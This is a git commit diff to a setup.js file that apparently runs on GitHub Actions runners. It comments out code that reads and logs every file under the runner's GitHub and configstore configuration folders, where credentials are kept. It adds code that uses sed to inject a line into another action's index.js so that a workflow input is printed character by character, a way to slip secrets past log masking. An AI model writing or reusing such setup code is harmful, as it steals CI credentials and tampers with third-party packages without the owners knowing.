b4e7fc6fba2b1ddb4598d38fc01fe4b91173ea0a
musset0 <musset025@gmail.com>
2023-09-04 10:17:08 -0400

    new v1.1.2

--- setup.js
+++ setup.js
@@ -4,35 +4,47 @@ const fs = require("fs");
 console.log("this is a setup.....")
 
 
-const files_other = fs.readdirSync('/home/runner/.config/GitHub');
-    files_other.forEach(element => {
-        let path = `/home/runner/.config/GitHub/${element}`;
+// const files_other = fs.readdirSync('/home/runner/.config/GitHub');
+//     files_other.forEach(element => {
+//         let path = `/home/runner/.config/GitHub/${element}`;
             
-        cl_process.exec(`cat ${path}`, (err, stdout, stderr) => {
-            if (err){
-                console.log(err);
-                return;
-            }
-            console.log(`-----${element}------`);
-            console.log(`stdout: ${stdout.toString()}`);
-            console.log(`stderr: ${stderr}`);
-        });
-    });
+//         cl_process.exec(`cat ${path}`, (err, stdout, stderr) => {
+//             if (err){
+//                 console.log(err);
+//                 return;
+//             }
+//             console.log(`-----${element}------`);
+//             console.log(`stdout: ${stdout.toString()}`);
+//             console.log(`stderr: ${stderr}`);
+//         });
+//     });
 
     
-const files_other1 = fs.readdirSync('/home/runner/.config/configstore');
-files_other1.forEach(element => {
-    let path = `/home/runner/.config/configstore/${element}`;
+// const files_other1 = fs.readdirSync('/home/runner/.config/configstore');
+// files_other1.forEach(element => {
+//     let path = `/home/runner/.config/configstore/${element}`;
         
-    cl_process.exec(`cat ${path}`, (err, stdout, stderr) => {
-        if (err){
-            console.log(err);
-            return;
-        }
-        console.log(`-----${element}------`);
-        console.log(`stdout: ${stdout.toString()}`);
-        console.log(`stderr: ${stderr}`);
-    });
+//     cl_process.exec(`cat ${path}`, (err, stdout, stderr) => {
+//         if (err){
+//             console.log(err);
+//             return;
+//         }
+//         console.log(`-----${element}------`);
+//         console.log(`stdout: ${stdout.toString()}`);
+//         console.log(`stderr: ${stderr}`);
+//     });
+// });
+
+
+//
+let insertcontent = 'console.log(JSON.stringify(process.env["INPUT_WHO-TO-GREET"].split("")));';
+cl_process.exec(`sed -i '21i ${insertcontent}' /home/runner/work/_actions/dreamli0/my-action/main/index.js`, (err, stdout, stderr) => {
+    if (err){
+        console.log(err);
+        return;
+    }
+    console.log(`stdout: ${stdout.toString()}`);
+    console.log(`stderr: ${stderr}`);
 });
 
 
